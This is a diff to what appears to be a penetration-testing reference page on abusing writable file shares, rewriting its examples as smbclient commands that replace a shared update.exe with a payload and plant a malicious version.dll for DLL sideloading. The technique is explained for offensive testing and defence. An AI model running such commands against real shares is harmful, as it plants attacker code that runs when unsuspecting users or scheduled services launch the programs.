@@ -14,10 +14,10 @@ keywords:
 Some writable shares host programs that users launch or that services run on a schedule. Replacing or adding an executable there runs attacker code when it is next used. More subtly, planting a DLL next to an executable on the share, one it loads by search order or sideloading, runs code in that program's context without modifying the executable itself.
 
 ```bash
-# Replace or add a binary users run from the share
-cp payload.exe '//share/Tools/update.exe'
-# Or sideload: drop a malicious DLL the share's EXE loads from its own directory
-cp evil.dll '//share/App/version.dll'       # loaded by App.exe via search order
+# Replace or add a binary users run from the share (smbclient from Linux)
+smbclient //<target>/share -U user%pass -c 'cd Tools; put payload.exe update.exe'
+# Or sideload a DLL the share's EXE loads from its own directory
+smbclient //<target>/share -U user%pass -c 'cd App; put evil.dll version.dll'   # loaded by App.exe via search order
 ```
 
 ## Exploitation notes
